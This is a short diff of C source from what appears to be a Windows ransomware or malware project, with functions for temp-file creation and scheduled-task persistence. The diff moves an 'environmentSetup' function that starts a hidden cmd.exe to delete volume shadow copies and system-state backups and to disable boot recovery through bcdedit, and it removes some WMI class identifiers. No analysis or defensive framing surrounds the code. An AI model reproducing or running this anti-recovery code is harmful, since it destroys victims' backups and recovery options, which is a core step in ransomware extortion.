@@ -3,10 +3,6 @@
 #include "wbemcli.h"
 #include "oleauto.h"
 LPCSTR tempFile_path;
-DWORD RCLSID_WBEMPROX_DLL[] = { 0x4590F811, 0x11D01D3A, 0x0AA001F89,0x242E4B00 };
-DWORD RCLSID_FASTPROX_DLL[] = { 0x674B6698, 0x11D0EE92, 0x0C00071AD, 0x0FFFDD84F };
-DWORD RIID_1[] = { 0x0DC12A687 , 0x11CF737F , 0x0AA004D88, 0x242E4B00 };
-DWORD RIID_2[] = { 0x44ACA674 , 0x11D0E8FC, 0x0C0007CA0,0x2088B64F };
 
 int createTemp() {
 	LPSTR lpTemp = (LPSTR)calloc(MAX_PATH, 1);
@@ -48,6 +44,7 @@ int createTemp() {
 	return_val = 0;
 	tempFile_path = lpTemp;
 CLEANUP:
+
 	free(lpCurrentFileName);
 	return return_val;
 }
@@ -99,6 +96,14 @@ int persistSchedule(BOOL start) {
 }
 
 
+int environmentSetup() {
+	LPCSTR command = "/C wmic SHADOWCOPY DELETE & wbadmin DELETE SYSTEMSTATEBACKUP & bcdedit.exe / set{ default } bootstatuspolicy ignoreallfailures & bcdedit.exe / set{ default } recoveryenabled No";
+
+	if ((int)ShellExecuteA(0, "open", "cmd.exe", command, 0, SW_HIDE) <= 32) {
+		return -1;
+	}
+}
+
 int mainPersist(BOOL start) {
 	if (start) {
 		if (createTemp() == -1) {
@@ -117,13 +122,4 @@ int mainPersist(BOOL start) {
 		return -1;
 	}
 	return 0;
-}
-
-
-int environmentSetup() {
-	LPCSTR command = "/C wmic SHADOWCOPY DELETE & wbadmin DELETE SYSTEMSTATEBACKUP & bcdedit.exe / set{ default } bootstatuspolicy ignoreallfailures & bcdedit.exe / set{ default } recoveryenabled No";
-
-	if ((int)ShellExecuteA(0, "open", "cmd.exe", command, 0, SW_HIDE) <= 32) {
-		return -1;
-	}
 }
